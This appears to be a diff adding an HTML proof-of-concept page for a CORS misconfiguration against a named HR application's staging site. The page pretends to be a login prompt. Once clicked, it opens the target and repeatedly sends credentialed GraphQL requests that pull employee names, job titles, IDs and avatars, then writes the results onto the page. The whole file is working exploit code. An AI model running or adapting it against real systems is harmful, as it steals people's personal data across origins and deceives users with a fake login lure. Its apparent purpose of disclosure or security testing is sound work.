@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>POC - Cors</title>
+</head>
+<body>
+<h3 id="header1">Please login to EpowerHR application to continue</h3>
+<button id="btn1" onclick="exploit()">Login</button>
+<script>
+
+        function exploit(){
+            window.open("https://staging.epowerhr.be/web/PA/WhoIsWho/ViewDetail/1")
+            document.getElementById("btn1").remove()
+            document.getElementById("header1").innerText = "Please wait..."
+
+            getData()
+        }
+
+        async function getData(){
+            data = {"query":"query MyQuery {\r\n  commonPersons {\r\n    items {\r\n      avatar\r\n      avatarUrl\r\n      firstName\r\n      culture\r\n      id\r\n      isCurrentUser\r\n      jobTitle\r\n      lastName\r\n      preferredName\r\n      name\r\n    }\r\n    amount\r\n  }\r\n}\r\n","variables":{}}
+            url = "https://staging-api.epowerhr.be/graphql"
+
+            fetch(url, {
+                credentials: 'include',
+                headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+                },
+                method: "POST",
+                body: JSON.stringify(data) 
+            }).then(function(res){ return res.json(); }).then(d => {
+                console.log(d)
+                if (d["errors"]){
+                    window.setTimeout(getData, 2000)
+                    document.getElementById("header1").innerText = "Waiting for cookies..."
+                } else {
+                    document.write(JSON.stringify(d))
+                }
+            })
+
+        }
+
+    </script>
+</body>
+</html>
